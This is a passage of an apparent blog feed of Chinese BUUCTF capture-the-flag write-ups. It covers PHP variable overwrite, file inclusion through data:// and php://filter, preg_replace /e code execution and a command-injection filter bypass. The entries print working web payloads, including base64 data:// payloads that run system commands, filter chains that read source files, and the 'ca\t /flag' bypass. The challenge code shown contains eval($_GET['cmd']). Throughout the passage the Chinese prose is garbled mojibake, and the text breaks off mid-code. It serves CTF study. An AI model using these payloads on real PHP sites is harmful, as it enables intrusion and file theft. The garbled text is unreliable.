alt="image-20210809092901502"></p><p>ä½¿ç”¨è¿˜æ²¡è¢«banæ‰çš„diræŒ‡ä»¤</p><p>æŸ¥è¯¢åˆ°æ–‡ä»¶</p><p><img src="/2021/08/08/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p><p>ç„¶åç›´æ¥ç”¨äº†å¤šæ•°åšå®¢éƒ½ä½¿ç”¨çš„ç»•è¿‡æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/08/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p><p>çœ‹ç½‘ä¸Šè¿˜æœ‰ä¸€ç§æ–¹æ³•è¯»å–flagï¼š</p><p>sortå‘½ä»¤ï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚</p><p><img src="/2021/08/08/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p><h4 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Mark loves cat</title>
      <link href="/2021/08/07/buu/9/"/>
      <url>/2021/08/07/buu/9/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹"><a href="#0x00çŸ¥è¯†ç‚¹" class="headerlink" title="0x00çŸ¥è¯†ç‚¹"></a>0x00çŸ¥è¯†ç‚¹</h4><ol><li><h5 id="gitæºç æ³„éœ²ï¼›"><a href="#gitæºç æ³„éœ²ï¼›" class="headerlink" title=".gitæºç æ³„éœ²ï¼›"></a>.gitæºç æ³„éœ²ï¼›</h5></li><li><h5 id="å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼ˆå‚è€ƒCTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ï¼‰"><a href="#å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼ˆå‚è€ƒCTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ï¼‰" class="headerlink" title="$$å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼ˆå‚è€ƒCTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ï¼‰"></a><code>$$</code>å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ï¼ˆå‚è€ƒ<a href="https://www.jianshu.com/p/a4d782e91852">CTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´</a>ï¼‰</h5></li></ol><h4 id="0x01è§£é¢˜"><a href="#0x01è§£é¢˜" class="headerlink" title="0x01è§£é¢˜"></a>0x01è§£é¢˜</h4><p>é¶æœºå¯åŠ¨ï¼š</p><p><img src="/2021/08/07/buu/9/image-20210807153209853.png" alt="image-20210807153209853"></p><p>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</p><p>æ‰«æä¸€ä¸‹ç›®å½•</p><p><img src="/2021/08/07/buu/9/image-20210807102252828.png" alt="image-20210807102252828"></p><p><img src="/2021/08/07/buu/9/image-20210807102702092.png" alt="image-20210807102702092"></p><p>ï¼ˆè°ƒä½çº¿ç¨‹åï¼‰</p><p><img src="/2021/08/07/buu/9/image-20210807110900544.png" alt="image-20210807110900544"></p><p>å‘ç°å­˜åœ¨flag.php</p><p>æˆ‘ä»¬å†ç”¨GitHackä¸‹è½½ä¸‹æ¥ã€‚</p><p>å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶index.phpå’Œflag.php</p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure><h5 id="ä»£ç å®¡è®¡ï¼š"><a href="#ä»£ç å®¡è®¡ï¼š" class="headerlink" title="ä»£ç å®¡è®¡ï¼š"></a>ä»£ç å®¡è®¡ï¼š</h5><h6 id="æ‘˜æŠ„éƒ¨åˆ†"><a href="#æ‘˜æŠ„éƒ¨åˆ†" class="headerlink" title="æ‘˜æŠ„éƒ¨åˆ†"></a>æ‘˜æŠ„éƒ¨åˆ†</h6><p><img src="/2021/08/07/buu/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>ä»£ç ä¸­çš„å˜é‡è¦†ç›–æ¼æ´</strong></p><p><img src="/2021/08/07/buu/9/202005042321468.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>å°è¯•ç¬¬ä¸€ä¸ªexitå¤„</strong>ï¼Œ</p><p>çœ‹æ³¨é‡Šï¼Œé”®åä¸èƒ½æœ‰flagï¼Œè€Œä¸”åˆè¦é”®åä¸ºflagçš„é”®å€¼ç­‰äºå…¶ä¸­ä¸€ä¸ªé”®åï¼Œä½ åˆè¦æˆ‘ä¸å­˜åœ¨ï¼Œåˆè¦æˆ‘å­˜åœ¨ï¼Œè¿›ä¸å»è¿™ä¸ªåˆ¤æ–­ï¼Œå‘Šè¾</p><p><img src="/2021/08/07/buu/9/1.jpg" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>å°è¯•ç¬¬äºŒä¸ªexitå¤„</strong></p><p>æˆ‘ä»¬æƒ³è¦é€šè¿‡å•çº¯çš„postå‚æ•°æå®šå®ƒæ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸ºpostå¤„çš„å˜é‡è¦†ç›–æ˜¯è®©å®ƒå˜æˆæˆ‘ä»¬å¯æ§çš„å€¼ï¼Œæ‰€ä»¥æä¸å®šã€‚</p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡å•çº¯çš„getæˆ–è€…get+postæå®š</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯è¾“å‡ºçš„$ydså˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦é€šè¿‡å˜é‡è¦†ç›–è¾¾åˆ°$yds=$flagçš„æ•ˆæœ</p><p>ç›´æ¥è¯´ç­”æ¡ˆæ¯”è¾ƒå¥½åˆ†æï¼šgetä¼ å‚ yds=flagï¼›<br>æˆ‘ä»¬çœ‹çœ‹å‚æ•°çš„ä¼ é€’æµç¨‹ï¼š</p><p><img src="/2021/08/07/buu/9/20200504233307150.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>åˆ†æï¼š</strong></p><p>åœ¨è¿™ä¸ªé‡Œé¢ï¼Œé¦–å…ˆæ˜¯ <strong>$x=yds,$=fla</strong>g ã€‚æŠŠå®ƒå¸¦è¿›foreaché‡Œé¢ï¼Œå°±å˜æˆäº†$yds=$flag ã€‚</p><p>**$$xå°±ç›¸å½“äºæ˜¯$($x)**ï¼Œè¿™æ ·å°±éå¸¸å¥½ç†è§£å˜é‡è¦†ç›–æ¼æ´äº†ã€‚</p><h5 id="è§£æ³•ä¸€ï¼š"><a href="#è§£æ³•ä¸€ï¼š" class="headerlink" title="è§£æ³•ä¸€ï¼š"></a>è§£æ³•ä¸€ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds&#x3D;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/08/07/buu/9/image-20210807155151631.png" alt="image-20210807155151631"></p><h5 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h5><p>è¿™é‡Œæ˜¯åˆ©ç”¨äº†exit($is)ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹ï¼Œè¦è¿›å…¥åˆ¤æ–­ï¼Œæ‰§è¡Œexit($is)éœ€è¦çš„æ¡ä»¶ï¼Œçœ‹æ³¨é‡Šã€‚</p><p><img src="/2021/08/07/buu/9/20200504233744435.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é‚£æˆ‘ä»¬å°±å…ˆä»postå‹flag=flagå¼€å§‹ï¼š</p><p>æˆ‘ä»¬postçš„æ•°æ®ï¼Œä¼šåœ¨è¿™ä¸€æ­¥ï¼ŒæŠŠåŸæ¥çš„$flagçš„å€¼æ”¹å˜ï¼Œå› ä¸º$x=flag,$y=flagï¼Œç„¶åå¸¦è¿›å»å˜æˆäº†$flag=flagã€‚</p><p>overï¼ŒåŸæ¥çš„flagå€¼è¢«æˆ‘ä»¬æ•´æ²¡äº†ï¼Œè¿™æ¡è·¯ä¸é€šï¼š</p><p><img src="/2021/08/07/buu/9/20200504233839775.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆ‘ä»¬è¯•è¯•getå‹çš„flag=flagï¼š<br>ï¼ˆç­”æ¡ˆï¼šis=flag&amp;flag=flagï¼‰</p><p><img src="/2021/08/07/buu/9/20200504234208601.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é¦–å…ˆåˆ†æå˜é‡è¦†ç›–å¤„ï¼š</p><p>é¦–å…ˆæ˜¯$x=is,$y=flag,å¸¦è¿›å»å°±å˜æˆäº†$is=$flag;<br>ç°åœ¨åˆ°äº†ç¬¬äºŒä¸ªå‚æ•°,$x=flag,$y=flagï¼Œå¸¦è¿›å»å˜æˆ$flag=$flagï¼Œè‡ªå·±å˜æˆè‡ªå·±ï¼Œæ²¡å•¥å½±å“ï¼Œæ²¡æœ‰æ”¹å˜flag çš„å€¼ï¼ŒæˆåŠŸã€‚</p><p><img src="/2021/08/07/buu/9/image-20210807155750060.png" alt="image-20210807155750060"></p><h4 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h4><p>å‚è€ƒåšå®¢ï¼š</p><p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ngçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (ä¸¤ç§è§£æ³•)ï¼ˆå˜é‡è¦†ç›–æ¼æ´ï¼‰_H9_dawnçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852">CTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´ - ç®€ä¹¦ (jianshu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</title>
      <link href="/2021/08/06/buu/8/"/>
      <url>/2021/08/06/buu/8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-çŸ¥è¯†ç‚¹"><a href="#0x00-çŸ¥è¯†ç‚¹" class="headerlink" title="0x00 çŸ¥è¯†ç‚¹"></a>0x00 çŸ¥è¯†ç‚¹</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents:"></a>file_get_contents:</h4><p>file_get_contentså‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><h5 id="è¯­æ³•ï¼š"><a href="#è¯­æ³•ï¼š" class="headerlink" title="è¯­æ³•ï¼š"></a>è¯­æ³•ï¼š</h5><p>file_get_contents(path,include_path,context,start,max_length)</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left">path</td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚</td></tr><tr><td align="left">include_path</td><td align="left">å¯é€‰ã€‚å¦‚æœä¹Ÿæƒ³åœ¨ include_path ä¸­æœå¯»æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥å°†è¯¥å‚æ•°è®¾ä¸º â€œ1â€ã€‚</td></tr><tr><td align="left">context</td><td align="left">å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥ã€‚</td></tr><tr><td align="left">start</td><td align="left">å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 æ–°åŠ çš„ã€‚</td></tr><tr><td align="left">max_length</td><td align="left">å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 æ–°åŠ çš„ã€‚</td></tr></tbody></table><h5 id="ä¾‹å­ï¼š"><a href="#ä¾‹å­ï¼š" class="headerlink" title="ä¾‹å­ï¼š"></a>ä¾‹å­ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;test.txt&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure><h4 id="text-plain"><a href="#text-plain" class="headerlink" title="text/plain"></a>text/plain</h4><p><a href="https://www.cnblogs.com/soundcode/p/4572251.html">text/htmlä¸text/plainæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - å·¦æ­£ - åšå®¢å›­ (cnblogs.com)</a></p><p>text/plainçš„æ„æ€æ˜¯å°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶å¹¶ä¸ä¼šå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p><h4 id="PHPä¼ªåè®®ä¸­çš„data-åè®®"><a href="#PHPä¼ªåè®®ä¸­çš„data-åè®®" class="headerlink" title="PHPä¼ªåè®®ä¸­çš„data://åè®®"></a>PHPä¼ªåè®®ä¸­çš„data://åè®®</h4><p>æ‘˜æŠ„äºï¼š<a href="https://blog.csdn.net/qq_46091464/article/details/106665358">æ–‡ä»¶åŒ…å«æ¼æ´ä¹‹PHPä¼ªåè®®ä¸­çš„data://çš„é‚£äº›äº‹~_Firebaskyçš„åšå®¢-CSDNåšå®¢</a></p><h5 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;include.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$file  &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    @include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload1ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><strong>æ— æ³•ä½¿ç”¨</strong></p><p>payload2ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p><strong>æ— æ³•ä½¿ç”¨</strong></p><p>payload3ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;*</span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥ä½¿ç”¨</strong></p><p>æ€»ç»“ï¼š<br>é€šè¿‡å®éªŒå‘ç°è¿™ä¸ªå¯èƒ½æ˜¯ç¼–ç çš„é—®é¢˜å› ä¸º<?php phpinfo();?>åœ¨ç¼–æˆbase64çš„æ—¶å€™å‡ºç°äº†+ã€‚è€Œæµè§ˆå™¨ä¸è®¤è¯†+å·ã€‚æ‰€ä»¥è§£å†³æ–¹æ³•</p><p>1.ä¸å†™åé¢çš„?&gt; å› ä¸ºPHPé‡Œé¢å…¶å®ä¸éœ€è¦å†™åé¢çš„ å‰é¢çš„ï¼›å·å°±å·²ç»è¯´æ˜ç»“æŸäº†ã€‚å¦‚æœæ²¡æœ‰ï¼›å·å°±å¿…é¡»å†™?&gt;ä½œä¸ºç»“æŸã€‚</p><p>2.æ·»åŠ ç©ºæ ¼æ”¹å˜base64ç¼–ç ã€‚</p><p>3.å°†+å·æ¢æˆ%2b</p><p>æ‰€ä»¥å…¶å®ä¸éœ€è¦é€šè¿‡base64ç¼–ç æ¥å®ç°ï¼ï¼ï¼<br>å°†<?php phpinfo();?>æ”¹å˜æˆurlç¼–ç ã€‚è¿™æ ·æµè§ˆå™¨å¯ä»¥è¯†åˆ«ï¼<br><img src="/2021/08/06/buu/8/20200610150733928.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="php-filteråè®®"><a href="#php-filteråè®®" class="headerlink" title="php://filteråè®®"></a>php://filteråè®®</h4><p>æ‘˜æŠ„äºï¼š</p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter çš„ä½¿ç”¨_hhh-CSDNåšå®¢</a></p><p>â€‹    php://filter æ˜¯phpä¸­ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–ï¼›</p><p>â€‹    æ ¹æ®åå­—ï¼Œfilterï¼Œå¯ä»¥å¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªåè®®å¯ä»¥ç”¨æ¥è¿‡æ»¤ä¸€äº›ä¸œè¥¿ï¼›</p><p>æ„é€ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;recource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>â€‹    è¿™å¥è¯çš„æ„æ€æ˜¯æˆ‘ä»¬ç”¨base64ç¼–ç çš„æ–¹å¼æ¥è¯»æ–‡ä»¶index.phpï¼›</p><p>â€‹    è¿™æ—¶é¡µé¢ä¼šæ˜¾ç¤ºå‡ºæºæ–‡ä»¶index.phpç»è¿‡base64ç¼–ç åçš„å†…å®¹ï¼Œç„¶åç»è¿‡base64è§£ç å°±å¯ä»¥çœ‹åˆ°flagï¼›</p><p><strong>æ€»ä¹‹å‘¢ï¼Œphp://filteråè®®æœ‰ä¸€ä¸‹å‡ ä¸ªåº”ç”¨ï¼š</strong></p><p>1ã€åˆ©ç”¨base64è·å¾—æºç </p><p>2ã€é€šè¿‡è¯»å†™ç¼–ç å®è¡Œç»•è¿‡æ“ä½œ</p><p><strong>é—®ï¼šä¸ºä»€ä¹ˆéœ€è¦ç”¨base64æ‰å¯ä»¥çœ‹åˆ°æºç  å¦‚æœæœ¬åœ°æºç æ˜¯æ˜æ–‡çš„è¯é‚£æ˜¯ä¸æ˜¯ä¸ç”¨è¿‡æ»¤å™¨</strong>ï¼Ÿ</p><p>â€‹    includeä¸€ä¸ªæ–‡ä»¶ä¸­æœ‰phpä»£ç ä¼šè¿›è¡Œphpè§£æï¼Œå¦‚æœæ˜¯æ˜æ–‡ï¼Œåˆ™ä¼šç›´æ¥è¿”å›æ˜æ–‡ã€‚ç”¨äº†è¿‡æ»¤å™¨ï¼Œå¦‚æœæ˜¯phpæ–‡ä»¶å°±ä¸ä¼šè§£æï¼Œå°±å¯ä»¥æ‹¿åˆ°phpæ–‡ä»¶çš„æºç äº†</p><p>â€‹    å…ˆæŠŠè¦è¯»å–çš„å†…å®¹ç»è¿‡base64ç¼–ç ç„¶åæ‰èƒ½æ˜¾ç¤ºå‡ºæ¥ï¼Œä¹‹åæˆ‘ä»¬å†ç»è¿‡è§£ç å°±å¯ä»¥æ˜¯å¯è¯»çš„äº†</p><h4 id="preg-replaceï¼ˆï¼‰å‡½æ•°"><a href="#preg-replaceï¼ˆï¼‰å‡½æ•°" class="headerlink" title="preg_replaceï¼ˆï¼‰å‡½æ•°"></a>preg_replaceï¼ˆï¼‰å‡½æ•°</h4><p>æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h3 id="0x01-è§£é¢˜"><a href="#0x01-è§£é¢˜" class="headerlink" title="0x01 è§£é¢˜"></a>0x01 è§£é¢˜</h3><p><img src="/2021/08/06/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p><p>ä»£ç å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">  if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    die(&quot;Not now!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  include($file); &#x2F;&#x2F;next.php</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œtextå’Œfileï¼Œä¹‹é—´ç”¨&amp;è¿æ¥å³å¯</p><p>ç›®çš„æ˜¯è·å¾—ä¸‹åˆ—æç¤ºçš„    next.php</p><p>è¦æ»¡è¶³ä¼ å…¥çš„æ–‡ä»¶å†…å®¹ä¸ºï¼šI have a dream</p><p>ä½¿ç”¨phpä¼ªåè®®ä¸­çš„data:åè®®å’Œphpçš„filter:åè®®</p><p>æ„é€ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p><p>è§£ç åä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line"></span><br><span class="line">  return preg_replace(</span><br><span class="line"></span><br><span class="line">â€‹    &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line"></span><br><span class="line">â€‹    &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line"></span><br><span class="line">â€‹    $str</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line"></span><br><span class="line">  echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">  @eval($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç° preg_replaceï¼ˆï¼‰å‡½æ•°æ˜¯ä¸€ä¸ªä»£ç æ‰§è¡Œçš„é—®é¢˜</p><p>å‘ç°è¿™æ˜¯ç”¨å›ºå®šè§£é¢˜æ ¼å¼ï¼š <strong>\S*=${}</strong></p><p><strong>payload1</strong></p><figure class="highlight 